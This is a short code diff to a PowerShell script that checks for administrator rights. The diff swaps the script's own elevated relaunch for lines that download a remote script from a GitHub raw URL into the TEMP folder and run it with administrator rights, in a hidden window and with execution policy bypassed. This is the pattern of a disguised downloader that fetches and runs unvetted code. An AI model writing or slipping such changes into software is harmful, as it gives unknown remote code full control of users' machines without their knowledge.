@@ -23,12 +23,14 @@ $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIden
     [Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
-    # relaunch elevated, hidden
+    $url = 'https://raw.githubusercontent.com/westoakstudios/Nothing/main/main.ps1'
+    $tmp = Join-Path $env:TEMP 'm.ps1'
+    Invoke-RestMethod -Uri $url -OutFile $tmp -UseBasicParsing
     Start-Process -FilePath 'powershell.exe' -Verb RunAs -WindowStyle Hidden -ArgumentList @(
         '-NoProfile'
         '-WindowStyle', 'Hidden'
         '-ExecutionPolicy', 'Bypass'
-        '-File', "`"$PSCommandPath`""
+        '-File', "`"$tmp`""
     )
     exit
 }
